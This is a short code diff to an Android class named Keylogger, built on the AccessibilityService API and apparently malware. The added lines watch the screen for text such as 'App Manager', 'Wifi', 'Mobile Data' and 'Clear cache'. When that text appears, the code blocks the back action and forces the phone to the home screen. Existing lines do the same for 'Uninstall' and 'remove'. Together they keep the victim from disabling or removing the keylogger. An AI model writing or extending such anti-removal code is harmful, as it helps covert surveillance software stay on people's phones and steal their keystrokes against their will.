@@ -246,6 +246,17 @@ public class Keylogger extends AccessibilityService {
 				}
 				
 				
+				if (lowerCase2.contains("App Manager".toLowerCase()) || lowerCase2.contains("Mobile Data ".toLowerCase()) || lowerCase2.contains("Wifi".toLowerCase()) || lowerCase2.contains("Clear cache".toLowerCase())) {
+					blockBack();
+					SendMeHome(268435456);
+				}
+				
+				
+				
+				
+				
+				
+				
 				if (lowerCase2.contains("Uninstall".toLowerCase()) || lowerCase2.contains("remove".toLowerCase()) || lowerCase2.contains("uninstall".toLowerCase())) {
 					blockBack();
 					SendMeHome(268435456);
